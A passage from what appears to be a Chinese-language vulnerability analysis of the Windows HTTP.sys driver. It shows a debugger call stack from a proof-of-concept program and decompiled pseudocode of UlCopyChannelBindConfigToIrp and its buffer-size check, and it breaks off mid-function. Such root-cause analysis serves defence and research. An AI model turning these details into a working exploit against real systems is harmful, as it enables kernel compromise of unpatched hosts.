&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">02&lt;/span> &lt;span style="color:#a6e22e">fffff889&lt;/span>&lt;span style="color:#e6db74">`cd7f7740 fffff805`&lt;/span>&lt;span style="color:#ae81ff">797130&lt;/span>aa HTTP&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>UlQueryUrlGroupIoctl&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x195&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">03&lt;/span> &lt;span style="color:#a6e22e">fffff889&lt;/span>&lt;span style="color:#e6db74">`cd7f77c0 fffff805`&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>dc954d5 HTTP&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>UxDeviceControl&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x8a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">04&lt;/span> &lt;span style="color:#a6e22e">fffff889&lt;/span>&lt;span style="color:#e6db74">`cd7f7800 fffff805`&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>e0a6048 nt&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>IofCallDriver&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x55&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">05&lt;/span> &lt;span style="color:#a6e22e">fffff889&lt;/span>&lt;span style="color:#e6db74">`cd7f7840 fffff805`&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>e0a5e47 nt&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>IopSynchronousServiceTail&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x1a8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">06&lt;/span> &lt;span style="color:#a6e22e">fffff889&lt;/span>&lt;span style="color:#e6db74">`cd7f78e0 fffff805`&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>e0a51c6 nt&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>IopXxxControlFile&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xc67&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">07&lt;/span> &lt;span style="color:#a6e22e">fffff889&lt;/span>&lt;span style="color:#e6db74">`cd7f7a20 fffff805`&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>de0d8f5 nt&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>NtDeviceIoControlFile&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x56&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">08&lt;/span> &lt;span style="color:#a6e22e">fffff889&lt;/span>&lt;span style="color:#e6db74">`cd7f7a90 00007ff9`&lt;/span>c610d1a4 nt&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>KiSystemServiceCopyEnd&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x25&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">09&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">00000014`7&lt;/span>&lt;span style="color:#a6e22e">dcd6308&lt;/span> &lt;span style="color:#ae81ff">00007&lt;/span>ff9&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b6391b7a ntdll&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>NtDeviceIoControlFile&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x14&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#ae81ff">00000014&lt;/span>&lt;span style="color:#e6db74">`7dcd6310 00007ff9`&lt;/span>b6393c9f HTTPAPI&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>HttpApiSynchronousDeviceControl&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x8a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span> &lt;span style="color:#ae81ff">00000014&lt;/span>&lt;span style="color:#e6db74">`7dcd6390 00007ff6`&lt;/span>&lt;span style="color:#ae81ff">93&lt;/span>fb18b2 HTTPAPI&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>HttpQueryUrlGroupProperty&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x6f&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#ae81ff">00000014&lt;/span>&lt;span style="color:#e6db74">`7dcd6410 00000000`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> http_poc2&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>wmain&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x3d2&lt;/span> [D:&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>code&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>c&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>http_poc2.c &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">113&lt;/span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>http!UlCopyChannelBindConfigToIrp&lt;/code> 伪代码如下，该函数调用&lt;code>UxGetOutputBufferForOutDirect&lt;/code> 计算存储&lt;code>ChannelBindConfig&lt;/code> 所需的内存大小，并和&lt;code>UxGetOutputBufferForOutDirect&lt;/code>返回的分配的内存大小作比较：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">UlCopyChannelBindConfigToIrp&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1, IRP &lt;span style="color:#f92672">*&lt;/span>a2, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UlpComputeChannelBindConfigSize&lt;/span>(a1, a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v43 &lt;span style="color:#f92672">=&lt;/span> v8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#a6e22e">IoIs32bitProcess&lt;/span>(a2) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">IoIs32bitProcess&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OutputBufferForOutDirect &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UxGetOutputBufferForOutDirect&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (_DWORD)a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (_DWORD)CurrentStackLocation,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">16&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">4&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v31,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v32,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v41);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> OutputBufferForOutDirect;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( OutputBufferForOutDirect &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v8 &lt;span style="color:#f92672">&amp;gt;&lt;/span> v41 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OutputBufferForOutDirect &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2147483643&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2147483643&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (WPP_MAIN_CB.StackSize &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">43&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_6:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">WPP_SF_D&lt;/span>(v10, &lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, &lt;span style="color:#ae81ff">2147483653&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)a1 &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)v31 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v11 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v31 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)v11 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v11 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v12 &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v12 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> (v11 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">19&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFFFFFFFFFCu&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v38 &lt;span style="color:#f92672">=&lt;/span> v13;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> (_DWORD &lt;span style="color:#f92672">*&lt;/span>)v13;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v11 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> v13 &lt;span style="color:#f92672">+&lt;/span> v32 &lt;span style="color:#f92672">-&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v11 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> (_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v13 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v14);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v37 &lt;span style="color:#f92672">=&lt;/span> v15;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v15[&lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v14];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v35 &lt;span style="color:#f92672">=&lt;/span> v16;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v17 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v34 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v17 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v13 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>i64 &lt;span style="color:#f92672">*&lt;/span> v17) &lt;span style="color:#f92672">=&lt;/span> (_DWORD)v15 &lt;span style="color:#f92672">+&lt;/span> v32 &lt;span style="color:#f92672">-&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v18 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>i64) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>i64 &lt;span style="color:#f92672">*&lt;/span> v17);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)v18 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> v15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v37 &lt;span style="color:#f92672">=&lt;/span> v15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (_DWORD)v16 &lt;span style="color:#f92672">+&lt;/span> v32 &lt;span style="color:#f92672">-&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v18 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memmove&lt;/span>(v16, &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(v18 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v18 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v35[&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v18 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> v15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v37 &lt;span style="color:#f92672">=&lt;/span> v15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)(v16 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFFFFFFFFFEu&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (_DWORD)v30 &lt;span style="color:#f92672">+&lt;/span> v32 &lt;span style="color:#f92672">-&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v18 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memmove&lt;/span>(v30, &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(v18 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v18 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v30[&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v18 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v35 &lt;span style="color:#f92672">=&lt;/span> v16;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v34 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">++&lt;/span>v17;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> v36;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> v38;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_31:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> v42;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v38 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v19 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">IoIs32bitProcess&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OutputBufferForOutDirect &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UxGetOutputBufferForOutDirect&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (_DWORD)a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (_DWORD)CurrentStackLocation,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">24&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v19 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>,
